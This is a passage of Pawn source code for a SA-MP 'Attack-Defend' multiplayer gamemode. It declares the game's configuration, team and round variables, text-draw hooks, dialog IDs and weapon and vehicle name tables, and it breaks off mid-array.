/*

	v2.7

	- Other fighting styles are made usable now with the power of /fightstyle.
	- AC Update allowing functions to be used without the plugin loaded.
	- Make sure you leave a message to your dead enemies using /deathdiss.
	- Fixed team win bug that could make wrong results in a round.
	- Server-sided health is real now
	- Server-sided death is real as well
	- Much code optimization's been done for better performence and smoother gameplay.
	- Color your messages with: ^r, ^b, ^y, ^o, ^g, ^p at the beginning of your message.
*/

#define GM_NAME				"Attack-Defend v2.7 (b4)"

#include <a_samp>			// Most samp functions (e.g. GetPlayerHealth and etc)
#include <foreach> 			// Used to loop through all connected players
#include <zcmd> 			// Used for commands.
#include <geolocation> 		// Shows player country based on IP
#include <strlib>
#include <progress2>
#include <profiler>

#include <sampac> // THE MIGHTY NEW ANTICHEAT


#define MAILER_URL "sixtytiger.com/khalid/AttDef_API/Mailer/mailer.php"

#include <mailer>

#define ENABLED_TDM     1 	// DISABLE TDM IF YOU WANT e.e
#define ANTICHEAT       0 	// If you want Whitetiger's Anti-Cheat, put 1 else 0.
#define MATCH_SYNC      0   // (Beta) Uploads each match data somewhere so that it can be easily displayed in a website.

native gpci (playerid, serial [], len);
native IsValidVehicle(vehicleid);


#undef MAX_PLAYERS
#define MAX_PLAYERS      		40

#if ANTICHEAT == 1
	#define _sampac_PLUGINS PLUGINS
	#include <sampac_api>
#endif

#define PUB:%1(%2) forward %1(%2); public %1(%2)

// freecam
enum noclipenum
{
	cameramode,
	flyobject,
	noclipcammode,
	lrold,
	udold,
	lastmove,
	Float:accelmul,
	bool:FlyMode
}
new noclipdata[MAX_PLAYERS][noclipenum];

new FightStyleIDs[6] =
{
	4,
	5,
	6,
	7,
	15,
	16
};

new FightStyleNames[6][11] =
{
	"Normal",
	"Boxing",
	"KungFu",
	"Knee-head",
	"Grab-kick",
	"Elbow-kick"
};

new bool:UpdateAKA = true;

new HeliWoodenBoard[MAX_VEHICLES];

// DestroyVehicle hooked for the sake of disco boards
stock _HOOKED_DestroyVehicle(vehicleid)
{
	if(HeliWoodenBoard[vehicleid] > -1)
    {
        DestroyObject(HeliWoodenBoard[vehicleid]);
        HeliWoodenBoard[vehicleid] = -1;
    }
	return DestroyVehicle(vehicleid);
}

#if defined _ALS_DestroyVehicle
	#undef DestroyVehicle
#else
	#define _ALS_DestroyVehicle
#endif

#define DestroyVehicle _HOOKED_DestroyVehicle

// Hooked some functions to reject unsafe game-texts.
stock _HOOKED_GameTextForPlayer(playerid, string[], time, style)
{
	if(!IsSafeGametext(string))
	    return -1;

	return GameTextForPlayer(playerid, string, time, style);
}

#if defined _ALS_GameTextForPlayer
	#undef GameTextForPlayer
#else
	#define _ALS_GameTextForPlayer
#endif

#define GameTextForPlayer _HOOKED_GameTextForPlayer

stock _HOOKED_GameTextForAll(string[], time, style)
{
	if(!IsSafeGametext(string))
	    return -1;

	return GameTextForAll(string, time, style);
}

#if defined _ALS_GameTextForAll
	#undef GameTextForAll
#else
	#define _ALS_GameTextForAll
#endif

#define GameTextForAll _HOOKED_GameTextForAll

stock Text:_HOOKED_TextDrawCreate(Float:x, Float:y, text[])
{
	if(!IsSafeGametext(text))
	    return Text:INVALID_TEXT_DRAW;

	return TextDrawCreate(x, y, text);
}

#if defined _ALS_TextDrawCreate
	#undef TextDrawCreate
#else
	#define _ALS_TextDrawCreate
#endif

#define TextDrawCreate _HOOKED_TextDrawCreate

stock PlayerText:_HOOKED_CreatePlayerTextDraw(playerid, Float:x, Float:y, text[])
{
	if(!IsSafeGametext(text))
	    return PlayerText:INVALID_TEXT_DRAW;

	return CreatePlayerTextDraw(playerid, x, y, text);
}

#if defined _ALS_CreatePlayerTextDraw
	#undef CreatePlayerTextDraw
#else
	#define _ALS_CreatePlayerTextDraw
#endif

#define CreatePlayerTextDraw _HOOKED_CreatePlayerTextDraw

stock _HOOKED_TextDrawSetString(Text:text, string[])
{
	if(!IsSafeGametext(string))
	    return -1;

	return TextDrawSetString(text, string);
}

#if defined _ALS_TextDrawSetString
	#undef TextDrawSetString
#else
	#define _ALS_TextDrawSetString
#endif

#define TextDrawSetString _HOOKED_TextDrawSetString

stock _HOOKED_PlayerTextDrawSetString(playerid, PlayerText:text, string[])
{
	if(!IsSafeGametext(string))
	    return -1;

	return PlayerTextDrawSetString(playerid, text, string);
}

#if defined _ALS_PlayerTextDrawSetString
	#undef PlayerTextDrawSetString
#else
	#define _ALS_PlayerTextDrawSetString
#endif

#define PlayerTextDrawSetString _HOOKED_PlayerTextDrawSetString

// Definations

#define NON 				0 	// Team nothing, used for when the player join the server
#define ATTACKER 			1 	// Attacker team
#define DEFENDER 			2 	// Defender team
#define REFEREE 			3 	// Referee team
#define ATTACKER_SUB 		4 	//
#define DEFENDER_SUB 		5


#define ATTACKER_PLAYING 		0xFF003355 	// Bright red color with 55 transparency (Range 00 - 99 - FF)
#define ATTACKER_NOT_PLAYING 	0xFF555555 	// Orange red color
#define ATTACKER_SUB_COLOR 		0xFFAAAA55 	// Yello red color
#define DEFENDER_PLAYING 		0x3344FF55 	// Bright blue color
#define DEFENDER_NOT_PLAYING 	0x3377FF55 	// Light blue color
#define DEFENDER_SUB_COLOR		0xAAAAFF55 	// Very light blue color
#define REFEREE_COLOR 			0xFFFF0055 	// Bright Yellow color
#define ATTACKER_ASKING_HELP    0xFF777788 	// Orange red color
#define DEFENDER_ASKING_HELP    0x7777FF88 	// Light blue color
#define TEAM_LEADER_COLOUR 		0xB7FFAEFF  // Light green colour



#define COL_PRIM    "{01A2F8}" // 0044FF   F36164 /* Dont change value of COL_PRIM define */

#define COL_SEC     "{FFFFFF}"

new MAIN_BACKGROUND_COLOUR = (0xEEEEEE33);
new MAIN_TEXT_COLOUR[16] /*   =	("~l~")*/;
new ColScheme[10] = ""COL_PRIM"";
// Freecam

#define MOVE_SPEED              100.0
#define ACCEL_RATE              0.03

#define CAMERA_MODE_NONE    	0
#define CAMERA_MODE_FLY     	1

#define MOVE_FORWARD    		1
#define MOVE_BACK       		2
#define MOVE_LEFT       		3
#define MOVE_RIGHT      		4
#define MOVE_FORWARD_LEFT       5
#define MOVE_FORWARD_RIGHT      6
#define MOVE_BACK_LEFT          7
#define MOVE_BACK_RIGHT         8

#define KNIFE           4
#define SILENCER        23
#define DEAGLE          24
#define SHOTGUN         25
#define COMBAT          27
#define MP5             29
#define AK47            30
#define M4              31
#define RIFLE           33
#define SNIPER          34
#define PARACHUTE		46

#define BASE            0
#define ARENA           1
#define TDM           	2

#define ANTILAG_TEAM    6

#define MAX_BASES 			100
#define MAX_ARENAS      	100
#define MAX_TEAMS 			6
#define MAX_DMS 			50
#define SAVE_SLOTS      	50
#define MAX_CHANNELS    	50
#define DRAW_DISTANCE   	25
#define MAX_STATS       	30
#define MAX_INI_ENTRY_TEXT 	80


#define DIALOG_NO_RESPONSE              0
#define DIALOG_WEAPONS_TYPE     		1
#define DIALOG_CURRENT_TOTAL    		2
#define DIALOG_TEAM_SCORE       		3
#define DIALOG_ATT_NAME         		4
#define DIALOG_DEF_NAME         		5
#define DIALOG_ATT_SCORE        		6
#define DIALOG_DEF_SCORE        		7
#define DIALOG_WEAPONS_LIMIT    		8
#define DIALOG_SET_1            		9
#define DIALOG_SET_2            		10
#define DIALOG_SET_3            		11
#define DIALOG_SET_4            		12
#define DIALOG_SET_5            		13
#define DIALOG_SET_6            		14
#define DIALOG_SET_7            		15
#define DIALOG_SET_8            		16
#define DIALOG_SET_9            		17
#define DIALOG_SET_10           		18
#define DIALOG_WAR_RESET        		19
#define DIALOG_SERVER_PASS      		20
#define DIALOG_LOGIN            		21
#define DIALOG_REGISTER         		22
#define DIALOG_ADMINS           		23
#define DIALOG_CLICK_STATS      		24
#define DIALOG_ARENA_GUNS       		25
#define DIALOG_CHANNEL_PLAYERS  		26
#define DIALOG_AKA			   		 	27
#define DIALOG_SERVER_HELP     		 	28
#define DIALOG_SWITCH_TEAM      		29
#define DIALOG_ANTICHEAT        		30
#define DIALOG_SERVER_STATS     		31
#define DIALOG_CONFIG		    		32
#define DIALOG_CONFIG_SET_TEAM_NAME     33
#define DIALOG_CONFIG_SET_TEAM_SKIN     34
#define DIALOG_CONFIG_SET_WEAPONS       35
#define DIALOG_CONFIG_SET_AAD           36
#define DIALOG_CONFIG_SET_TEAM_COLOR    37
#define DIALOG_CONFIG_SET_MAX_PING      38
#define DIALOG_CONFIG_SET_MAX_PACKET    39
#define DIALOG_CONFIG_SET_MIN_FPS       40
#define DIALOG_CONFIG_SET_DEF_SKIN      41
#define DIALOG_CONFIG_SET_ATT_SKIN      42
#define DIALOG_CONFIG_SET_ROUND_TIME    43
#define DIALOG_CONFIG_SET_CP_TIME       44
#define DIALOG_CONFIG_SET_ROUND_HEALTH  45
#define DIALOG_CONFIG_SET_ROUND_ARMOUR  46
#define DIALOG_CONFIG_SET_FIRST_WEAPON  47
#define DIALOG_CONFIG_SET_SECOND_WEAPON 48
#define EDITSHORTCUTS_DIALOG            49
#define GETVAL_DIAG                     50
#define DIALOG_HELPS                    51
#define PLAYERCLICK_DIALOG              52
#define DIALOG_SWITCH_TEAM_CLASS        53
#define DIALOG_ROUND_LIST               54 // dialog for showing list of rounds played in last match mode or current.
#define DIALOG_THEME_CHANGE1            55
#define DIALOG_THEME_CHANGE2            56
#define DIALOG_ADMIN_CODE               57
#define DIALOG_REPLACE_FIRST            58
#define DIALOG_REPLACE_SECOND           59

new w0[MAX_PLAYERS];	//heartnarmor
new REPLACE_ToAddID[MAX_PLAYERS]; // replace with dialogs

#define PRESSED(%0) 	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define RELEASED(%0) 	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

#define ATTACKER_CHANGES_X      19.4
#define ATTACKER_CHANGES_Y      0
#define DEFENDER_CHANGES_X      -79
#define DEFENDER_CHANGES_Y      0

new DB:sqliteconnection;

// - Global Textdraws -

new Text: AntiLagTD; // Antilag
new Text: WebText;
new Text: ACText;
new Text: AnnTD;
new Text: PauseTD;
new Text: RoundStats; // Shows team names, players alive and team hp.
new Text: RoundsPlayed; // Shows how many rounds are played out of for example 9 rounds. (Rounds 3/9)
new Text: TeamScoreText; // Shows team name and score (e.g. TeK 3 CZE 3)
new Text: WeaponLimitTD;
new Text: LockServerTD;
new Text: CloseText;
new Text: WarModeText;
new Text: SettingBox;
new Text: AttHpLose;
new Text: DefHpLose;
new Text: TeamHpLose[2];
new Text: EN_AttackerBox;
new Text: EN_DefenderBox;
new Text: AttackerTeam[4];
new Text: DefenderTeam[4];
new Text: EN_CheckPoint;
new GotHit[MAX_PLAYERS];

// - Round Textdraws - added by Niko_boy // -

new Text:centerblackBG;
new Text:fullBox3D;
new Text:leftRedBG;
new Text:rightBlueBG;
new Text:timerCenterTD;
new Text:leftTeamData;
new Text:rightTeamData;
new Text:centerTeamNames;

//

// - Result Textdraws - added by Niko_boy // -

	new //designer:
		Text: leftBG		, 	Text: rightBG     	,
		Text: leftUpBG		, 	Text: rightUpBG 	,
		Text: leftHeader	,	Text: rightHeader	,
		Text: leftULine		, 	Text: rightULine	,
		Text: leftUpText	, 	Text: rightUpText	,
		Text: leftText		, 	Text: rightText		,
	 	Text: leftTop		,	//Text: rightTop      ,
	 	Text: lowerBG		,	Text: lowerULine	,
	 	Text: topTextScore  , 	Text: teamWonHow	,
	 	//contents:
        Text: leftNames		, 	Text: rightNames	,
        Text: leftKills		, 	Text: rightKills	,
        Text: leftHP		, 	Text: rightHP		,
        Text: leftDeaths    ,   Text: rightDeaths   ,
        Text: leftDmg		, 	Text: rightDmg		,
        Text: leftAcc		, 	Text: rightAcc		,
        Text: leftPlayed	, 	Text: rightPlayed

	;
	
// - Player Textdraws -


new PlayerText: FPSPingPacket; // Ping, FPS and Packetloss textdraw on top right corner.
new PlayerText: RoundKillDmgTDmg; // Shows Kills, Damage and Total Damage on the left hand side of the radar.
new PlayerText: DoingDamage[3]; // Shows when player hit someone.
new PlayerText: GettingDamaged[3]; // Shows when someone hit you.
new PlayerText: RoundText; // Shows round start time.
new PlayerText: WhoSpec[2]; // Shows who is spectating you.
new PlayerText: SpecText[4]; // Shows spectated player info.
new PlayerText: AreaCheckTD; // Show countdown textdraw when the player is out of arena.
new PlayerText: AreaCheckBG;
new PlayerText: DeathText[2];
new PlayerText: TD_RoundSpec;
new PlayerText: ArmourTextDraw;
new PlayerText: HPTextDraw_TD;
new PlayerText: BaseID_VS;
new PlayerText: BITCH;
new PlayerText: TargetInfoTD;
new PlayerText: DeathMessage[2]; new DeathMessageStr[MAX_PLAYERS][64];
new PlayerBar: HealthBar, PlayerBar:ArmourBar;


new ThemeChange_listitem[MAX_PLAYERS];

#if ENABLED_TDM == 1
new TeamTDMKills[MAX_TEAMS];
new LowPlayers[MAX_TEAMS];
#define DEFAULT_TDM_TIME 15 // in mins , because TDM is meant to be played for long time ;)
#endif
new MaxTDMKills = 10;

// object sign var's
new g_oSignText[4];

// - Player Variables -

new Float:PlayerHealth[MAX_PLAYERS], Float:PlayerArmour[MAX_PLAYERS];

enum PlayerVariables {
	#if ENABLED_TDM == 1
	bool: InTDM,
	#endif
	Name[MAX_PLAYER_NAME],
	NameWithoutTag[MAX_PLAYER_NAME],
	bool:Logged,
	bool:IgnoreSpawn,
	bool:InDM,
	bool:InDuel,
	bool:Syncing,
	bool:Playing,
	bool:WasInCP,
	bool:IsKicked,
	bool:Spectating,
	bool:BeingSpeced,
	bool:CalledByPlayer,
	bool:WasInBase,
	bool:TextDrawOnScreen,
	bool:Spawned,
	bool:IsAFK,
	bool:IsFrozen,
	bool:IsGettingKicked,
	bool:AskingForHelp,
	AskingForHelpTimer,
	bool:Mute,
	bool:ToAddInRound,
	bool:DontPause,
	bool:AntiLag,
	bool:TextPos,
	bool:ShowSpecs,
	bool:blockedall,
	bool:FakePacketRenovation,
	bool:HasVoted,
	NetCheck,
	FPSCheck,
	PLCheck,
	PingCheck,
	challengerid,
    duelweap1,
    duelweap2,
	DuelsWon,
	DuelsLost,
	LastMsgr,
	blockedid,
	Style,
	FightStyle,
	
	VoteToAddID,
	VoteToNetCheck,
	IsSpectatingID,
	Level,
	ChatChannel,
	Weather,
	Time,
	Team,
	TeamBeforeDuel,
	TempTeam,
	DLlast,
	FPS,
	Float:pHealth,
	Float:pArmour,
	DMReadd,
	RoundKills,
	RoundDeaths,
	Float:RoundDamage,
	TotalKills,
	TotalDeaths,
	Float:TotalDamage,
	WeaponPicked,
	OutOfArena,
	PacketKick,
	PingKick,
	FPSKick,
	ACKick,
	DeathIcon,
	LastVehicle,
	TimesSpawned,
	VWorld,
	lastChat,
	LastAskLeader,
	RoundPlayed,
	shotsHit,
	Float:Accuracy,
	Float:TotalAccuracy,
	TotalshotsHit,
	TotalBulletsFired,
	RconTry,
	PauseCount,
	Votekick,
	SpectatingRound,
	SpectatingType,
	HitBy,
	HitWith,
	HitSound,
	GetHitSound,
	iLastVehicle,
	LastEditWepLimit,
	LastEditWeaponSlot,
	WeaponStat[55],
	PlayerTypeByWeapon[16],
	bool:ToGiveParachute,
	bool:OnGunmenu,
	ReaddOrAddTickCount

}
new Player[MAX_PLAYERS][PlayerVariables];

enum ShortcutsStruct
{
	Shortcut1[50],
	Shortcut2[50],
	Shortcut3[50],
	Shortcut4[50]
}

new PlayerShortcut[MAX_PLAYERS][ShortcutsStruct];
new EditingShortcutOf[MAX_PLAYERS];
new LastClickedPlayer[MAX_PLAYERS];

new TargetInfoTimer[MAX_PLAYERS];

enum save_vars
{
	pName[24],
	pNameWithoutTag[24],
	Float:gHealth,
	Float:gArmour,
	pTeam,
	pInterior,
	pVWorld,
	Float:pCoords[4],
	Float:RDamage,
	Float:TDamage,
	RKills,
	TKills,
	RDeaths,
	TDeaths,
	WeaponsPicked,
	RoundID,
	TPlayed,
	iAccuracy,
	tshotsHit,
	tBulletsShot,
	bool:WasCrashedInStart,
	bool:ToBeAdded,
	bool:CheckScore,
	bool:PauseWait,
	WeaponStat[55],
	pVehicleID,
	pSeatID,
	HadParachute
}
new SaveVariables[SAVE_SLOTS][save_vars];

enum rankingEnum {
    player_Score,
    player_Team,
    player_Kills,
    player_Deaths,
    player_TPlayed,
    player_HP,
    player_Acc,
    player_ID
}

// - Base Variables -

new Float:BAttackerSpawn[MAX_BASES][3];
new Float:BDefenderSpawn[MAX_BASES][3];
new Float:BCPSpawn[MAX_BASES][3];
new BInterior[MAX_BASES];
new BName[MAX_BASES][128];
new bool:BExist[MAX_BASES] = false;
new TotalBases;
new VoteCount[MAX_BASES] = 0;


// - Arena Variables -

new Float:AAttackerSpawn[MAX_ARENAS][3];
new Float:ADefenderSpawn[MAX_ARENAS][3];
new Float:ACPSpawn[MAX_ARENAS][3];
new AInterior[MAX_ARENAS];
new AName[MAX_ARENAS][128];
new Float:AMax[MAX_ARENAS][2];
new Float:AMin[MAX_ARENAS][2];
new bool:AExist[MAX_ARENAS] = false;
new TotalArenas;

new ArenaWeapons[2][MAX_PLAYERS];
new MenuID[MAX_PLAYERS];

// - DM Variables -

new Float:DMSpawn[MAX_DMS][4];
new DMInterior[MAX_DMS];
new DMWeapons[MAX_DMS][3];
new bool:DMExist[MAX_DMS] = false;

// - AntiLag Variables -

new Float:ZMax[2];
new Float:ZMin[2];

enum round_record
{
    round__ID,
	round__type, //1 base | 2 arena
	bool: round__completed
}
new MatchRoundsRecord[ 101 ][ round_record ];
new MatchRoundsStarted = 0;


// - Config Variables -

new MainWeather; // Server start up weather
new MainTime; // Server start up time
new ConfigCPTime;
new ConfigRoundTime;
new Float:MainSpawn[4];
new MainInterior;
new TotalRounds;
new WeatherLimit = 50;
new TimeLimit = 50;
new WebString[128];
new VotingTime = 20;

new bool:TeamHPDamage = true; //If "true", hides the spectate information and enables the textdraws on the left and right hand sid of the screen for player HP and Damage in round.
new bool:ToggleTargetInfo = false; //Shows target player information.
new bool:ServerAntiLag = false; //Enalbe/Disable AntiLag in the whole script.
new bool:GiveKnife = true; // Auto-gives knives to players in round
new bool:ShowBodyLabels = true; // Enable/Disable show 3d text labels on body (ping fps etc)
new bool:VoteRound = true; // Enable/Disable /vote command.
new bool:ChangeName = true; // Enable/Disable /changename command.
new bool:VoteInProgress = false;

new Float:RoundHP = 100.0, Float:RoundAR = 100.0;

new Skin[MAX_TEAMS];
new TextColor[MAX_TEAMS][10];
new TDC[MAX_TEAMS][7];
new bool:TeamHasLeader[MAX_TEAMS];
new TeamLeader[MAX_TEAMS];


new GunMenuWeapons[10][2];

new OnlineInChannel[MAX_CHANNELS];

// - Global Strings -

#define MAX_SERVER_PASS_LENGH 6

new WeaponStatsStr[3000];
new ChatString[128];
new ServerPass[MAX_SERVER_PASS_LENGH + 9]; // contains "password " plus the password itself
new hostname[64];
new lagcompmode;
new ScoreString[4][256];
new TotalStr[2500];
//new Exception[24];

new AttList[256];
new AttKills[256];
new AttDeaths[256];
new AttPlayed[256];
new AttAcc[256];
new AttDamage[256];

new DefList[256];
new DefKills[256];
new DefDeaths[256];
new DefPlayed[256];
new DefAcc[256];
new DefDamage[256];

new AKAString[1024];
new HelpString[3000];


// - boolen variables

new bool:AllowStartBase = true;
new bool:PreMatchResultsShowing = false;
new bool:PlayerOnInterface[MAX_PLAYERS];
new bool:AllMuted = false;
#if ANTICHEAT == 1
	new bool:AntiCheat = false;
	new ACTimer;

#endif

new bool:AutoBal = true;
new bool:AntiSpam = true;
new bool:ShortCuts = false;
new bool:AutoPause = true;
new bool:LobbyGuns = true;
new bool:DatabaseLoading = false;
new AnnTimer;


// - Numerical Variables

new ViewTimer;
new PauseCountdown;
new CurrentCPTime;
new HighestID;


new IconTimer[MAX_PLAYERS];
new AttHpTimer;
new DefHpTimer;

// - Round Variables

new bool:BaseStarted 	= false;
new bool:ArenaStarted 	= false;
new bool:RoundPaused 	= false;
new bool:RoundUnpausing = false;
new bool:WarMode 		= false;
new bool:PausePressed 	= false;
new bool:ServerLocked 	= false;
new bool:PermLocked 	= false;
#if ANTICHEAT == 1
new bool:PermAC 		= false;
#endif
//new bool:AttWin 		= true;
new bool:MatchEnded 	= false;
new bool:FallProtection = false;
//new bool:Trolling 	= false;

new Current = -1;
new WeaponLimit[10];
new TimesPicked[MAX_TEAMS][10];
new PlayersAlive[MAX_TEAMS];
new bool:TeamHelp[MAX_TEAMS];
new Float:TeamHP[MAX_TEAMS];
new TeamName[MAX_TEAMS][24];
new TeamScore[MAX_TEAMS];
new Float:TempDamage[MAX_TEAMS];
new ServerLastPlayed;
new ServerLastPlayedType;

new PlayersInCP;
new RoundMints;
new RoundSeconds;
new GameType;
new CurrentRound;
new Float:VehiclePos[MAX_PLAYERS][3];
new Float:VehicleVelc[MAX_VEHICLES][3];
new CPZone;
new ArenaZone;
new ElapsedTime;

new RecentBase[MAX_BASES];
new RecentArena[MAX_ARENAS];
new ArenasPlayed;
new BasesPlayed;

new Float:Max_Packetloss;
new Max_Ping;
new Min_FPS;

new UnpauseTimer;


// - OnPlayerTakeDamage Variables


new gLastHit[6][MAX_PLAYERS];
new TakeDmgCD[6][MAX_PLAYERS];
//new Float:HPLost[MAX_PLAYERS][MAX_PLAYERS];
new Float:DamageDone[6][MAX_PLAYERS];
new DmgLabelStr[3][MAX_PLAYERS][128];




// - 3D Textdraws

new Text3D:PingFPS[MAX_PLAYERS];
new Text3D:DmgLabel[MAX_PLAYERS];

new WeaponNames[55][] =
{
        {"Punch"},{"Brass Knuckles"},{"Golf Club"},{"Nite Stick"},{"Knife"},{"Baseball Bat"},{"Shovel"},{"Pool Cue"},{"Katana"},{"Chainsaw"},{"Purple Dildo"},
        {"Smal White Vibrator"},{"Large White Vibrator"},{"Silver Vibrator"},{"Flowers"},{"Cane"},{"Grenade"},{"Tear Gas"},{"Molotov Cocktail"},
        {""},{""},{""}, // Empty spots for ID 19-20-21 (invalid weapon id's)
        {"9mm"},{"Silenced 9mm"},{"Deagle"},{"Shotgun"},{"Sawn-off"},{"Combat"},{"Micro SMG"},{"MP5"},{"AK-47"},{"M4"},{"Tec9"},
        {"Rifle"},{"Sniper"},{"Rocket"},{"HS Rocket"},{"Flamethrower"},{"Minigun"},{"Satchel Charge"},{"Detonator"},
        {"Spraycan"},{"Fire Extinguisher"},{"Camera"},{"Nightvision Goggles"},{"Thermal Goggles"},{"Parachute"}, {"Fake Pistol"},{""}, {"Vehicle"}, {"Helicopter Blades"},
		{"Explosion"}, {""}, {"Suicide"}, {"Collision"}
};


new aVehicleNames[212][] =
{
        {"Landstalker"},    {"Bravura"},            {"Buffalo"},            {"Linerunner"},     {"Perrenial"},      {"Sentinel"},       {"Dumper"},
        {"Firetruck"},      {"Trashmaster"},        {"Stretch"},            {"Manana"},         {"Infernus"},       {"Voodoo"},         {"Pony"},           {"Mule"},
        {"Cheetah"},        {"Ambulance"},          {"Leviathan"},          {"Moonbeam"},       {"Esperanto"},      {"Taxi"},           {"Washington"},
        {"Bobcat"},         {"Mr Whoopee"},         {"BF Injection"},       {"Hunter"},         {"Premier"},        {"Enforcer"},       {"Securicar"},
        {"Banshee"},        {"Predator"},           {"Bus"},{"Rhino"},      {"Barracks"},       {"Hotknife"},       {"Artic Trailer 1"},      {"Previon"},
        {"Coach"},          {"Cabbie"},             {"Stallion"},           {"Rumpo"},          {"RC Bandit"},      {"Romero"},         {"Packer"},         {"Monster"},
        {"Admiral"},        {"Squalo"},             {"Seasparrow"},         {"Pizzaboy"},       {"Tram"},           {"Artic Trailer 2"},      {"Turismo"},
        {"Speeder"},        {"Reefer"},             {"Tropic"},             {"Flatbed"},        {"Yankee"},         {"Caddy"},          {"Solair"},         {"Berkley's RC Van"},
        {"Skimmer"},        {"PCJ-6_0_0"},          {"Faggio"},             {"Freeway"},        {"RC Baron"},       {"RC Raider"},      {"Glendale"},       {"Oceanic"},
        {"Sanchez"},        {"Sparrow"},            {"Patriot"},            {"Quad"},           {"Coastguard"},     {"Dinghy"},         {"Hermes"},         {"Sabre"},
        {"Rustler"},        {"ZR-3_5_0"},           {"Walton"},             {"Regina"},         {"Comet"},{"BMX"},  {"Burrito"},        {"Camper"},         {"Marquis"},
        {"Baggage"},        {"Dozer"},              {"Maverick"},           {"News Chopper"},   {"Rancher"},        {"FBI Rancher"},    {"Virgo"},          {"Greenwood"},
        {"Jetmax"},         {"Hotring"},            {"Sandking"},           {"Blista Compact"}, {"Police Maverick"},{"Boxville"},       {"Benson"},
        {"Mesa"},           {"RC Goblin"},          {"Hotring Racer A"},    {"Hotring Racer B"},{"Bloodring Banger"},{"Rancher"},
        {"Super GT"},       {"Elegant"},            {"Journey"},            {"Bike"},           {"Mountain Bike"},  {"Beagle"},         {"Cropdust"},       {"Stunt"},
        {"Tanker"},         {"Roadtrain"},          {"Nebula"},             {"Majestic"},       {"Buccaneer"},      {"Shamal"},         {"Hydra"},          {"FCR-900"},
        {"NRG-500"},        {"HPV1000"},            {"Cement Truck"},       {"Tow Truck"},      {"Fortune"},        {"Cadrona"},        {"FBI Truck"},
        {"Willard"},        {"Forklift"},           {"Tractor"},            {"Combine"},        {"Feltzer"},        {"Remington"},      {"Slamvan"},
        {"Blade"},          {"Freight"},            {"Streak"},             {"Vortex"},         {"Vincent"},        {"Bullet"},         {"Clover"},         {"Sadler"},
        {"Firetruck LA"},   {"Hustler"},            {"Intruder"},           {"Primo"},          {"Cargobob"},       {"Tampa"},          {"Sunrise"},        {"Merit"},
        {"Utility"},        {"Nevada"},             {"Yosemite"},           {"Windsor"},        {"Monster A"},      {"Monster B"},      {"Uranus"},         {"Jester"},
        {"Sultan"},         {"Stratum"},            {"Elegy"},              {"Raindance"},      {"RC Tiger"},       {"Flash"},          {"Tahoma"},         {"Savanna"},
        {"Bandito"},        {"Freight Flat"},       {"Streak Carriage"},    {"Kart"},           {"Mower"},          {"Duneride"},       {"Sweeper"},
        {"Broadway"},       {"Tornado"},            {"AT-400"},             {"DFT-30"},         {"Huntley"},        {"Stafford"},       {"BF-400"},         {"Newsvan"},
        {"Tug"},            {"Chemical Trailer"},          {"Emperor"},            {"Wayfarer"},       {"Euros"},          {"Hotdog"},         {"Club"},           {"Freight Carriage"},
        {"Artic Trailer 3"},      {"Andromada"},          {"Dodo"},               {"RC Cam"},         {"Launch"},         {"Police Car LSPD"},{"Police Car SFPD"},
        {"Police _LVPD"},   {"Police Ranger"},      {"Picador"},            {"SWAT. Van"},      {"Alpha"},          {"Phoenix"},        {"Glendale"},
        {"Sadler"},         {"Luggage Trailer A"},  {"Luggage Trailer B"},  {"Stair Trailer"},{"Boxville"},         {"Farm Plow"},
        {"Utility Trailer"}
};

new const Float:AntiLagSpawn[6][4] = {
	{-1131.4969,1041.7166,1345.7367,272.7359},
	{-1110.4144,1084.2610,1341.9084,268.4978},
	{-1074.6858,1044.4030,1344.1488,353.0150},
	{-996.6344,1035.2316,1341.9446,69.4899},
	{-995.8419,1088.6527,1342.1597,137.4838},
	{-972.4203,1076.5132,1345.0020,85.2820}
};

new ValidSounds[] =
{
    1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020,
    1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041,
    1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062,
    1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083,
    1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104,
    1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125,
    1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146,
    1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167,
    1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188,
    1189, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1807, 1808, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819,
    1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 2000, 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010,
    2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031,
    2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050, 2051, 2052,
    2053, 2054, 2055, 2056, 2057, 2058, 2059, 2060, 2061, 2062, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 2070, 2071, 2072, 2073,
    2074, 2075, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2094,
    2095, 2096, 2097, 2098, 2099, 2100, 2101, 2102, 2103, 2104, 2105, 2106, 2107, 2108, 2109, 2110, 2111, 2112, 2113, 2114, 2115,
